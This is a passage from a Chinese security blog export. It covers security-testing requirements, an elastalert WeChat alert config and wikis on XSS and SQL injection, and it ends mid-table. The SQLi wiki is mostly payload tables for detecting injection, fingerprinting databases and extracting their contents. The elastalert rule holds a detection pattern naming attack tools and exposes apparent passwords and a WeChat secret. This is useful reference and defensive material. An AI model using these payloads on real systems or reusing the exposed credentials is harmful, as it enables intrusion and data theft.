测试大纲中的这些要求应当参照设计说明书中所描述的设计目标进<br>行测试用例的设计，包括但不限于：</li><li style="list-style: none"><input type="checkbox"> 应用系统服务器端和单个终端进行安全数据传输的最大容量。</li><li style="list-style: none"><input type="checkbox"> 应用系统服务器端能够与多少终端同时进行安全数据传输。</li><li style="list-style: none"><input type="checkbox"> 服务器承受的最大并发连接数。</li><li>4、 渗透性测试：模拟攻击手段，对应用系统抵抗攻击的能力进行测试。主要测试应用程序及应用系统配置上的安全漏洞。</li><li style="list-style: none"><input type="checkbox"> 渗透测试的具体应全部包含在测试大纲中，在大纲的测试用例中体现具体的测试方法。</li><li style="list-style: none"><input type="checkbox"> 测试大纲中渗透测试方法的选择需要依据设计说明书中描述的应用系统采用的开发工具及应用系统安装所需要的基础应用平台，如iis、apached等，来设计不同的测试方法，包括但不限于：</li><li style="list-style: none"><input type="checkbox"> 对webserver的渗透攻击测试或者工具扫描性测试。</li><li style="list-style: none"><input type="checkbox"> SQL注入、跨栈攻击。</li><li>5、 审核性测试：</li><li style="list-style: none"><input type="checkbox"> 代码审核。这不是必需的测试手段，如果条件允许，可以针对容易出现代码漏洞的程序，特别是关于身份认证等方面的部分代码进行审核。</li><li style="list-style: none"><input type="checkbox"> 可以采用开发相关的专用扫描工具，或者编制相应的脚本程序，检查代码中的不安全函数的使用，如：strcpy()，strcat()等。</li><li>6、 测试过程中，应详细记录测试过程发生的每一件事情，列出测试过程中<br>发现的问题。这些信息包括：发现了什么，在哪里发现的，当时的环境，这些问题是否可重现。</li><li>7、 应根据测试的过程和测试结果，提出被测试系统、测试过程等方面的改进说明。</li><li>8、 应确保测试用例、测试内容和测试结果的保密性。</li></ul><h3 id="5-3-测试环境及人员安全要求"><a href="#5-3-测试环境及人员安全要求" class="headerlink" title="5.3 测试环境及人员安全要求"></a>5.3 测试环境及人员安全要求</h3><ul><li>1、 测试环境的物理、硬软件环境要求应当可以模拟真实环境。</li><li>2、 为确保测试环境的安全，应将测试环境与开发环境、生产环境相隔离，避免测试工作对业务的影响。</li><li>3、 测试数据如果选择是真实数据，应限定使用该数据的测试人员的数量，并在测试完成后全部删除。</li><li>4、 系统测试和验收通常需要大量的（真实数据）尽可能靠近实际运行数据的测试数据。应避免使用含有个人信息的业务数据库。如果要使用其中信息，在用之前应使其失去个性化。当把运行数据用于测试目的时，应采取以下措施保护运行数据。</li><li style="list-style: none"><input type="checkbox"> 如果该数据由测试人员使用，则需要相关授权业务人员参与，或者监督。</li><li style="list-style: none"><input type="checkbox"> 每次把运行信息复制到测试应用系统都应有单独的授权。</li><li style="list-style: none"><input type="checkbox"> 应记录运行信息的复制和使用，以提供一种检查追踪。</li><li>5、 在与其他系统的互操作性测试中，应充分考虑对其他系统的影响，选择适当的时间、方法。</li></ul><h3 id="5-4-测试后的要求"><a href="#5-4-测试后的要求" class="headerlink" title="5.4 测试后的要求"></a>5.4 测试后的要求</h3><p>测试完成后，在正式上线前，应进行安全检查，消除测试用的一切后门、用户名及口令等，包括但不限于：</p><ul><li>1、 测试用的测试数据，即测试过程中的临时数据，特别注意要删除授权访问的那些重要测试数据。</li><li>2、 测试用的账号、口令，特别是有高级权限的账号。</li><li>3、 测试用时临时开通的系统服务、防火墙端口及策略。</li><li>4、 与外系统测试时，要求外系统上临时开启的服务、账号等。</li></ul>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全文档 </tag>
            
            <tag> SDL </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ELK实现微信告警</title>
      <link href="/deployment/ELK%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E5%91%8A%E8%AD%A6/"/>
      <url>/deployment/ELK%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E5%91%8A%E8%AD%A6/</url>
      <content type="html"><![CDATA[<h3 id="安装elastalert"><a href="#安装elastalert" class="headerlink" title="安装elastalert"></a>安装elastalert</h3><p><code>git clone https://github.com/Yelp/elastalert.git</code><br><code>cd elastalert</code><br><code>python setup.py install</code><br><code>pip install -r requirements.txt</code><br><code>cp config.yaml.example config.yaml</code></p><h3 id="配置elastalert"><a href="#配置elastalert" class="headerlink" title="配置elastalert"></a>配置elastalert</h3><p>在es上创建索引<br><code>elastalert-create-index</code><br>修改配置文件<br><code>vi config.yaml</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rules_folder: example_rules</span><br><span class="line">run_every:</span><br><span class="line">  seconds: 3</span><br><span class="line">buffer_time:</span><br><span class="line">  minutes: 15</span><br><span class="line">es_host: 192.168.3.110</span><br><span class="line">es_port: 9200</span><br><span class="line">es_username: elastic</span><br><span class="line">es_password: shuqinkeji</span><br><span class="line">writeback_index: elastalert_status</span><br><span class="line">alert_time_limit:</span><br><span class="line">  days: 1</span><br></pre></td></tr></table></figure></p><p><code>mkdir elastalert_modules/</code><br>微信告警插件：<a href="https://github.com/anjia0532/elastalert-wechat-plugin" target="_blank" rel="noopener">下载</a>wechat_qiye_alert.py脚本到elastalert_modules目录下<br><code>touch elastalert_modules/__init__.py</code><br><code>cd example_rules/</code><br><code>vi example_frequency.yaml</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">es_host: 192.168.1.41</span><br><span class="line">es_port: 9200</span><br><span class="line">use_ssl: false</span><br><span class="line">es_username: elastic</span><br><span class="line">es_password: shuqinkeji</span><br><span class="line">name: Example frequency rule</span><br><span class="line">type: frequency</span><br><span class="line">index: nginx*</span><br><span class="line">num_events: 5</span><br><span class="line">timeframe:</span><br><span class="line">  hours: 1 </span><br><span class="line">filter:</span><br><span class="line"> - query_string: </span><br><span class="line">     # SQL、XSS、扫描</span><br><span class="line">        query: &quot;request: select.+(from|limit) OR request: union(.*?)select OR request: into.+(dump|out)file OR</span><br><span class="line">        request: (base64_decode|sleep|benchmark|and.+1=1|and.+1=2|or%20|exec|information_schema|where%20|union%20|%2ctable_name%20|cmdshell|table_schema) OR</span><br><span class="line">        request: (iframe|script|body|img|layer|div|meta|style|base|object|input|onmouseover|onerror|onload|alert) OR</span><br><span class="line">        request: .+etc.+passwd OR http_user_agent：(HTTrack|harvest|audit|dirbuster|pangolin|nmap|sqln|-scan|hydra|Parser|libwww|BBBike|sqlmap|w3af|owasp|Nikto|fimap|havij|PycURL|zmeu|BabyKrokodil|netsparker|httperf|bench) OR</span><br><span class="line">        status: (400|404|500|501)</span><br><span class="line">        NOT (request:_health.html OR remote_addr:222.222.222.222  )</span><br><span class="line">        &quot;</span><br><span class="line">include: [&quot;data.slbip&quot;,&quot;data.method&quot;,&quot;data.url&quot;,&quot;data.status&quot;,&quot;data.serverip&quot;,&quot;data.referer&quot;]</span><br><span class="line">alert:</span><br><span class="line">- &quot;elastalert_modules.wechat_qiye_alert.WeChatAlerter&quot;</span><br><span class="line">corp_id: ww6bb8958dca9fe27b</span><br><span class="line">secret: c0RvZ906WXuuaJE_Jxd3eUq2bQJWwfoAZPJX8MjNzPg</span><br><span class="line">agent_id: 1000002</span><br><span class="line">party_id: 1</span><br><span class="line">user_id: &quot;@all&quot;</span><br></pre></td></tr></table></figure></p><p>更多配置详见 <a href="https://elastalert.readthedocs.io/en/latest/#" target="_blank" rel="noopener">官方文档</a></p>]]></content>
      
      <categories>
          
          <category> deployment </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 企业安全 </tag>
            
            <tag> ELK </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>XSS wiki</title>
      <link href="/Bug/XSS/"/>
      <url>/Bug/XSS/</url>
      <content type="html"><![CDATA[<h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>　　跨站点脚本（XSS）攻击是一种注入类型，其中恶意脚本被注入到其他良性和可信赖的网站中。当攻击者使用Web应用程序将恶意代码（通常以浏览器端脚本的形式）发送给不同的最终用户时，就会发生XSS攻击。允许这些攻击成功的缺陷非常普遍，并且发生在Web应用程序在其生成的输出中使用来自用户的输入而无需验证或编码它的任何地方。<br>　　攻击者可以使用XSS将恶意脚本发送给毫无戒心的用户。最终用户的浏览器无法知道该脚本不应该被信任，并将执行该脚本。因为它认为脚本来自可靠来源，所以恶意脚本可以访问任何cookie，会话令牌或浏览器保留并与该站点一起使用的其他敏感信息。这些脚本甚至可以重写HTML页面的内容。</p><h2 id="二、XSS类型"><a href="#二、XSS类型" class="headerlink" title="二、XSS类型"></a>二、XSS类型</h2><p>　　XSS攻击通常可以分为三类：反射型、存储型和DOM型。</p><h3 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1.反射型"></a>1.反射型</h3><p>　　反射型是指注入的脚本从Web服务器反射出来的攻击，例如错误消息，搜索结果或包含作为请求的一部分发送到服务器的部分或全部输入的任何其他响应。反射型攻击在电子邮件中或在其他一些网站上植入恶意代码。当用户被欺骗点击恶意链接，提交特制表单，甚至只是浏览恶意网站时，注入的代码会发送到易受攻击的网站，之后服务器将代码返回浏览器，浏览器执行来自“可信”服务器的恶意代码。</p><h3 id="2-存储型"><a href="#2-存储型" class="headerlink" title="2.存储型"></a>2.存储型</h3><p>　　存储型是指注入的脚本永久存储在目标服务器上的攻击，例如在数据库，消息论坛，访问者日志，注释字段等中。受害者在请求存储时从服务器检索恶意脚本。</p><h3 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="3.DOM型"></a>3.DOM型</h3><p>　　DOM型是指注入的脚本修改受害者浏览器中的DOM“环境”而执行，以便客户端代码以“意外”方式运行。页面本身（即HTTP响应）不会改变，但由于DOM环境中发生的恶意修改。</p>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> wiki </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQL注入wiki</title>
      <link href="/Bug/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/Bug/SQL%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h2 id="1-检测SQL注入"><a href="#1-检测SQL注入" class="headerlink" title="1. 检测SQL注入"></a>1. 检测SQL注入</h2><p>　　可以通过多种方式检测注入。其中最简单的方法是在各种参数后添加<code>&#39;</code>或<code>&quot;</code>从而得到一个从Web服务器返回的数据库报错信息。以下部分描述了在哪里可以找到这些参数以及如何检测这些参数。<br><a id="more"></a></p><h3 id="参数位置"><a href="#参数位置" class="headerlink" title="参数位置"></a>参数位置</h3><p><strong>HTTP请求中常见的注入点如下</strong></p><ul><li>GET - HTTP Request<br>　　在常见的HTTP GET请求（以及大多数请求类型）中，有一些常见的注入点。例如：网址参数（下面的请求的<code>id</code>），Cookie，host以及任何自定义headers信息。然而，HTTP请求中的任何内容都可能容易受到SQL注入的攻击。</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?id=注入点1</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 注入点2</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.9</span><br><span class="line"><span class="attribute">X-Server-Name</span>: 注入点3</span><br><span class="line"><span class="attribute">Cookie</span>: user=注入点4;</span><br></pre></td></tr></table></figure><ul><li>POST - Form Data<br>　　在具有Content-Type为application/x-www-form-urlencoded的标准HTTP POST请求中，注入将类似于GET请求中的URL参数。它们位于HTTP头信息下方，但仍可以用相同的方式进行利用。</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: netspi.com.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 39</span><br><span class="line"></span><br><span class="line">username=注入点1&amp;email=注入点2</span><br></pre></td></tr></table></figure><ul><li>POST - JSON<br>　　在具有Content-Type为application/json的标准HTTP POST请求中，注入通常是<code>JSON{&quot;key&quot;:&quot;value&quot;}</code>对的值。该值也可以是数组或对象。虽然符号是不同的，但值可以像所有其他参数一样注入。（提示：尝试使用<code>&#39;</code>，但要确保JSON使用双引号，否则可能会破坏请求格式。）</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: netspi.com.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 56</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">"username":"注入点1",</span><br><span class="line">"email":"注入点2"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>POST - XML<br>　　在具有Content-Type为application/xml的标准HTTP POST请求中，注入通常在一个内部<xmlobject></xmlobject>。虽然符号是不同的，但值可以像所有其他参数一样注入。（提示：尝试使用<code>&#39;</code>）</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: netspi.com.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 79</span><br><span class="line"></span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;username&gt;注入点1&lt;/username&gt;</span><br><span class="line">&lt;email&gt;注入点2&lt;/email&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><h3 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h3><p>　　通过在应用程序中触发错误和布尔逻辑，可以最轻松地检测易受攻击的参数。提供格式错误的查询将触发错误，并且使用各种布尔逻辑语句发送有效查询将触发来自Web服务器的不同响应。</p><p>注：True或False语句应通过HTTP状态码或HTML内容返回不同的响应。如果这些响应与查询的True/False性质一致，则表示存在注入。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>逻辑测试</td><td style="text-align:center">page.asp?id=1 or 1=1 – true <br>page.asp?id=1’ or 1=1 – true<br>page.asp?id=1” or 1=1 – true<br>page.asp?id=1 and 1=2 – false</td></tr><tr><td>算术</td><td style="text-align:center">product.asp?id=1/1 – true<br> product.asp?id=1/0 – false</td></tr><tr><td>基于盲注：<br>检测盲注可能需要识别或猜测DBMS，<br>并检查以找到适当的时间函数。</td><td style="text-align:center"><a href="#blindBased">详见</a></td></tr><tr><td>基于错误：<br>注意：使用无效语法的逻辑测试和算术<br>也可能会导致错误。</td><td style="text-align:center"><a href="#errorBased">详见</a></td></tr></tbody></table><h2 id="2-DBMS识别"><a href="#2-DBMS识别" class="headerlink" title="2.DBMS识别"></a>2.DBMS识别</h2><p>　　检测正在使用的数据库管理系统（DBMS）对于进一步利用注入来说至关重要。没有这些知识，就无法确定要查询的表，内置的函数以及要避免的检测。下面查询的成功响应表明正在使用所选的DBMS.</p><p>注意：注释字符 <code>--</code> 放置在查询后面，以删除查询后面的任何命令，有助于防止出现错误。</p><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>SLEEP</td><td style="text-align:center">page.php?id=1’-SLEEP(1)=0 LIMIT 1 –</td></tr><tr><td>BENCHMARK</td><td style="text-align:center">page.php?id=1’-BENCHMARK(5000000, ENCODE(‘Slow Down’,’by 5 seconds’))=0 LIMIT 1 –</td></tr><tr><td>字符串连接</td><td style="text-align:center">page.php?id=’ ‘mysql’ –</td></tr><tr><td>错误消息<br>注意：通过无效语法触发数据库错误<br>有时会返回包含DBMS名称的详细错误消息。</td><td style="text-align:center">page.php?id=’</td></tr></tbody></table><p><strong>一般提示</strong></p><p>　　PHP应用程序通常具有MySQL数据库。</p><p><strong>将查询转换为注入</strong></p><p>　　既然已经确定了注入点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。<code>SELECT @@version</code>将是示例查询。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>联合查询</td><td style="text-align:center">product.php?id=’ UNION SELECT @@version –</td></tr><tr><td>联合子查询</td><td style="text-align:center">product.php?id=’ UNION (SELECT @@version) –</td></tr><tr><td>联合null <br>注意：如果原始查询返回多个列，<br>则添加null以等于列数</td><td style="text-align:center">product.php?id=4 UNION SELECT @@version,null –</td></tr><tr><td>堆积式查询<br>注意：堆积式查询并不总是返回结果，<br>因此它们最适合用于更新/修改数据的注入。</td><td style="text-align:center">product.php?id=’; INSERT INTO ‘docs’ (‘content’) VALUES ((SELECT @@version)) –</td></tr></tbody></table><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>字符串连接</td><td style="text-align:center">page.jsp?id=’&#124;&#124;’oracle’ –</td></tr><tr><td>默认表</td><td style="text-align:center">page.jsp?id=’UNION SELECT 1 FROM v$version –</td></tr><tr><td>错误消息<br>注意：通过无效语法触发数据库错误<br>有时会返回包含DBMS名称的详细错误消息。</td><td style="text-align:center">page.jsp?id=’</td></tr></tbody></table><p><strong>一般提示</strong></p><p>　　根据应用程序提供的错误，如果存在“ORA-XXXX”错误，其中每个X都是整数，则表示数据库是Oracle.</p><p>　　JSP应用程序通常具有Oracle数据库。</p><p><strong>将查询转换为注入</strong></p><p>　　既然已经确定了诸如点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。<code>SELECT banner FROM v$version</code>将是示例查询。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>联合查询</td><td style="text-align:center">product.jsp?id=’ UNION SELECT banner FROM v$version –</td></tr><tr><td>联合子查询</td><td style="text-align:center">product.jsp?id=’ UNION (SELECT banner FROM v$version) –</td></tr><tr><td>联合null <br>注意:如果原始查询返回多个列，<br>则添加null以等于列数-1</td><td style="text-align:center">product.jsp?id=’ UNION SELECT banner,null FROM v$version –</td></tr></tbody></table><h3 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h3><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>WAITFOR 函数</td><td style="text-align:center">page.asp?id=’;WAITFOR DELAY ‘00&#58;00&#58;10’; –</td></tr><tr><td>默认变量</td><td style="text-align:center">page.asp?id=sql’; SELECT @@SERVERNAME –</td></tr><tr><td>错误消息<br>注意：通过无效语法触发数据库错误<br>有时会返回包含DBMS名称的详细错误消息。</td><td style="text-align:center">page.asp?id=’</td></tr><tr><td>错误消息<br>注意：如果id参数是整数，<br>则@@ SERVERNAME变量的字符串值可能导致转换错误。</td><td style="text-align:center">page.asp?id=@@SERVERNAME</td></tr><tr><td>错误消息<br>注意：如果id参数是整数，<br>则@@ SERVERNAME变量的字符串值可能导致转换错误。</td><td style="text-align:center">page.asp?id=0/@@SERVERNAME</td></tr></tbody></table><p><strong>一般提示</strong></p><p>　　基于ASP / ASPX的应用程序一般都是MSSQL。</p><p><strong>将查询转换为注入</strong></p><p>　　既然已经确定了注入点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。<code>SELECT @@version</code>将是示例查询。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>联合查询</td><td style="text-align:center">product.asp?id=’ UNION SELECT @@version –</td></tr><tr><td>联合子查询</td><td style="text-align:center">product.asp?id=’ UNION (SELECT @@version) –</td></tr><tr><td>联合null <br>注意：如果原始查询返回多个列，<br>则添加null以等于列数</td><td style="text-align:center">product.asp?id=’ UNION (SELECT @@version,null) –</td></tr><tr><td>堆积式查询<br>注意：堆积式查询并不总是返回结果，<br>因此它们最适合用于更新/修改数据的注入。</td><td style="text-align:center">product.asp?id=’; SELECT @@version –</td></tr></tbody></table><h2 id="3-注入类型"><a href="#3-注入类型" class="headerlink" title="3.注入类型"></a>3.注入类型</h2><h3 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a><span id="errorBased">显错注入</span></h3><p>　　当无效输入传递给数据库时，通过触发数据库中的错误来利用基于错误的注入。错误消息可用于返回完整的查询结果，或获取有关如何重构查询以供进一步利用的信息。</p><h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>XML解析错误</td><td style="text-align:center">SELECT extractvalue(rand(),concat(0x3a,(select version())))</td></tr><tr><td>双查询</td><td style="text-align:center">SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(<strong>SELECT username FROM USERS LIMIT 0,1</strong>),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)  <br>递增 limit 0,1到limit 1,1开始循环数据</td></tr><tr><td>获取当前数据库</td><td style="text-align:center">SELECT a()</td></tr></tbody></table><h4 id="Oracle-1"><a href="#Oracle-1" class="headerlink" title="Oracle"></a>Oracle</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>无效的HTTP请求</td><td style="text-align:center">SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual</td></tr><tr><td>CTXSYS.DRITHSX.SN</td><td style="text-align:center">SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual</td></tr><tr><td>无效的XPath</td><td style="text-align:center">SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual</td></tr><tr><td>无效的XML</td><td style="text-align:center">SELECT to_char(dbms_xmlgen.getxml(‘select “‘&#124;&#124;(select user from sys.dual)&#124;&#124;’” FROM sys.dual’)) FROM dual</td></tr><tr><td>无效的XML</td><td style="text-align:center">SELECT rtrim(extract(xmlagg(xmlelement(“s”, username &#124;&#124; ‘,’)),’/s’).getstringval(),’,’) FROM all_users</td></tr></tbody></table><h4 id="SQL-Server-1"><a href="#SQL-Server-1" class="headerlink" title="SQL Server"></a>SQL Server</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>显式转换</td><td style="text-align:center">SELECT convert(int,(SELECT @@version)) <br>SELECT cast((SELECT @@version) as int)</td></tr><tr><td>隐式转换</td><td style="text-align:center">SELECT 1/@@version</td></tr></tbody></table><h4 id="MSSQL-CAST函数示例"><a href="#MSSQL-CAST函数示例" class="headerlink" title="MSSQL CAST函数示例"></a>MSSQL CAST函数示例</h4><p>　　以下任何查询都可以使用该<code>convert</code>函数重写或作为隐式转换.</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>将CAST函数注入当前查询</td><td style="text-align:center">SELECT CAST(@@version as int)</td></tr><tr><td>显示系统用户</td><td style="text-align:center">SELECT CAST(SYSTEM_USER as int);</td></tr><tr><td>用xml路径在一行中显示所有数据库</td><td style="text-align:center">SELECT CAST((SELECT name,’,’ FROM master..sysdatabases FOR XML path(‘’)) as int) <br>SELECT CAST((SELECT name AS “data()” FROM master..sysdatabases FOR xml path(‘’)) AS int);</td></tr><tr><td>显示服务器名称</td><td style="text-align:center">SELECT CAST(@@SERVERNAME as int);</td></tr><tr><td>显示服务名称</td><td style="text-align:center">SELECT CAST(@@SERVICENAME as int);</td></tr><tr><td>显示数据库列表 <br>注意：下面的查询必须在一行中执行。</td><td style="text-align:center"><code>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = &#39;&#39;;SELECT @listStr = @listStr + Name + &#39;,&#39; FROM master..sysdatabases;SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);</code></td></tr><tr><td>显示表列表 <br> 注意：下面的查询必须在一行中执行</td><td style="text-align:center"><code>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX); SET @listStr = &#39;&#39;;SELECT @listStr = @listStr + Name + &#39;,&#39; FROM MYDATABASE..sysobjects WHERE type = &#39;U&#39;;SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);</code></td></tr><tr><td>显示列列表 <br>注意：下面的查询必须在一行中执行。</td><td style="text-align:center"><code>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = &#39;&#39;;SELECT @listStr = @listStr + Name + &#39;,&#39; FROM MYDATABASE..syscolumns WHERE id=object_id(&#39;MYTABLE&#39;);SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);select cast(@myoutput as int);</code></td></tr><tr><td>显示列数据<br>注意：下面的查询必须在一行中执行。 用<code>*</code>替换<code>MYCOLUMN</code>来选择所有列</td><td style="text-align:center"><code>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = &#39;&#39;;SELECT @listStr = @listStr + MYCOLUMN + &#39;,&#39; FROM MYDATABASE..MYTABLE;SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1)SELECT CAST(@myoutput as int);</code></td></tr><tr><td>一次显示一个数据库名称<br>注意：递增内部TOP值以获取下一条记录</td><td style="text-align:center"><code>SELECT TOP 1 CAST(name as int) FROM sysdatabases WHERE name in (SELECT TOP 2 name FROM sysdatabases ORDER BY name ASC) ORDER BY name DESC</code></td></tr></tbody></table><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>　　基于联合的SQL注入允许攻击者通过扩展原始查询返回的结果来从数据库中提取信息。 仅当原始/新查询具有相同结构（列的数量和数据类型）时，才能使用联合运算符。</p><h4 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL"></a>MySQL</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>联合</td><td style="text-align:center">SELECT “mysql” UNION SELECT @@version</td></tr><tr><td>联合子查询</td><td style="text-align:center">SELECT “mysql” UNION (select @@version)</td></tr><tr><td>联合null <br>注意：如果原始查询返回多个列，则添加null以等于列数</td><td style="text-align:center">SELECT “mysql”,”test” UNION SELECT @@version,null</td></tr><tr><td>堆叠查询 <br>注意：堆叠查询并不总是返回结果，因此它们最适合用于更新/修改数据的注入。</td><td style="text-align:center">SELECT “mysql”; INSERT INTO ‘docs’ (‘content’) VALUES ((SELECT @@version))</td></tr></tbody></table><h4 id="Oracle-2"><a href="#Oracle-2" class="headerlink" title="Oracle"></a>Oracle</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>联合</td><td style="text-align:center">SELECT user FROM dual UNION SELECT * FROM v$version</td></tr><tr><td>联合子查询</td><td style="text-align:center">SELECT user FROM dual UNION (SELECT * FROM v$version)</td></tr><tr><td>联合null <br>注意：如果原始查询返回多个列，则添加null以等于列数</td><td style="text-align:center">SELECT user,dummy FROM dual UNION (SELECT banner,null FROM v$version)</td></tr></tbody></table><h4 id="SQL-Server-2"><a href="#SQL-Server-2" class="headerlink" title="SQL Server"></a>SQL Server</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>联合</td><td style="text-align:center">SELECT user UNION SELECT @@version</td></tr><tr><td>联合子查询</td><td style="text-align:center">SELECT user UNION (SELECT 